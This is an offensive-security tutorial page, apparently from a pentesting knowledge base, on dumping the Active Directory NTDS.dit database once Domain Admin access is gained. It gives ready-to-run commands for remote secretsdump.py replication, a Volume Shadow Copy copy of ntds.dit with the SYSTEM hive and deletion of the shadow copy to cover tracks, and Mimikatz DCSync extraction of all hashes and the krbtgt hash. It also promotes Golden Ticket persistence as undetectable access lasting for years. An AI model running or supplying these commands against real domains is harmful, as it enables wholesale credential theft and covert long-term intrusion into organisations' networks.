---
title: "Dumping the NTDS.dit"
sidebar_position: 1
tags:
    - ntds
    - dump
---

You've done it. After hours of careful enumeration, privilege escalation, and lateral movement, you've finally compromised a Domain Admin account. You have the run of the entire Active Directory domain. The war is won, right? Almost. Now it's time to secure the ultimate prize, the digital crown jewels of the kingdom: the **NTDS.dit** file.

Dumping the NTDS.dit file is the final step in a successful AD pentest. It's the act of exfiltrating the entire Active Directory database, which contains the password hash for every single user and computer in the domain.

Think of it this way: If compromising a Domain Admin account is like getting the master key to the bank, dumping NTDS.dit is like wheeling the entire vault out the front door to take home with you. It gives you everything you need to maintain access, crack every password at your leisure, and demonstrate total, unrecoverable compromise to the client.

---

### ## The "Why": What's Inside the Treasure Chest?

The `NTDS.dit` file is a database that lives exclusively on Domain Controllers (in `C:\Windows\NTDS\`). It contains:

* **Every User's NTLM Hash:** The password hashes for all users, from the newest intern to the CEO.
* **Every Computer's Hash:** All machine account hashes.
* **The `krbtgt` Account Hash:** This is the most important secret of all. The `krbtgt` account is used to encrypt all Kerberos tickets in the domain. Owning its hash allows you to forge your own Kerberos tickets (a "Golden Ticket" attack), granting you god-like administrative access to anything in the domain, forever.
* The entire AD schema, group memberships, and GPO information.

---

### ## The Challenge: The File is Locked

You can't just copy and paste `NTDS.dit` like a normal file. The LSASS process has a permanent lock on it while the Domain Controller is running, preventing anyone from tampering with it. Therefore, we need to use special techniques to get a copy.

---

### ## The Heist: Methods for Dumping the Database

There are several ways to get the goods. You'll also always need the **SYSTEM registry hive** (`C:\Windows\System32\config\SYSTEM`), which contains the boot key required to decrypt the database file.

#### **Method 1: The Remote Dump with `secretsdump.py` (The Cleanest Way)**

This is the preferred method for most pentesters. It's stealthy, fast, and doesn't require you to get an interactive shell on the Domain Controller.

* **Prerequisite:** Credentials for a Domain Admin or any account with Directory Replication Service (DRS) rights.
* **How it Works:** Impacket's `secretsdump.py` uses the DRS protocol to politely ask the DC to replicate its user information, including the password hashes. Because you're using a trusted account, the DC happily complies. No files are touched on the DC's disk.
* **The Command:**
    ```bash
    # Run from your attacker machine
    secretsdump.py -just-dc 'corp.local/DomainAdmin:Password123!'@192.168.1.10
    ```
    This will dump all the hashes and save them to a `.ntds` file, neatly organized for cracking.

#### **Method 2: The Live Dump with Volume Shadow Copy (The Classic Way)**

If you have an interactive shell on the Domain Controller, you can use a built-in Windows feature called the Volume Shadow Copy Service (VSS) to create a snapshot of the disk.

* **Prerequisite:** An interactive shell (RDP, PsExec, WinRM) on the DC as an administrator.
* **How it Works:** VSS creates a point-in-time copy of the drive. You can then copy `NTDS.dit` from this "shadow" copy, bypassing the file lock.
* **The Commands:**
    ```powershell
    # 1. Create a shadow copy for drive C:
    vssadmin create shadow /for=C:

    # 2. Copy the NTDS.dit file from the newly created shadow copy
    #    The path will be displayed after creation.
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\

    # 3. Copy the SYSTEM hive needed to decrypt the ntds.dit file
    reg save hklm\system C:\temp\system.hive

    # 4. Clean up your tracks by deleting the shadow copy
    vssadmin delete shadows /for=C: /quiet
    ```
    You can now exfiltrate the `ntds.dit` and `system.hive` files from the `C:\temp` directory.

#### **Method 3: The In-Memory Dump with Mimikatz (The DCSync Attack)**

Instead of going after the file, you can use Mimikatz to perform a DCSync attack, which uses the same DRS replication rights to pull credentials directly from the LSASS process memory.

* **Prerequisite:** An interactive shell on the DC with administrator/debug privileges.
* **How it Works:** You instruct Mimikatz to act like a replica Domain Controller and request user data.
* **The Command:**
    ```
    mimikatz # privilege::debug
    mimikatz # lsadump::dcsync /domain:corp.local /all /csv
    ```
    Or, to just get the all-important `krbtgt` hash:
    ```
    mimikatz # lsadump::dcsync /user:krbtgt
    ```

---

### ## How It Fits into Your Strategy

Dumping NTDS.dit is the final act of a domain compromise. It's the point of no return.

* **Persistence:** The `krbtgt` hash allows you to create Golden Tickets, ensuring you have persistent, undetectable access to the domain for years to come, even if all other passwords are changed.
* **Total Information Disclosure:** You now have the hash for every user. You can take this data offline and run a password cracking campaign to discover the plaintext passwords for a huge percentage of the user base, demonstrating the full impact of the breach.
* **The Ultimate Trophy:** For a pentester, the `ntds.dit` file is the ultimate trophy, proving without a doubt that the entire kingdom has fallen.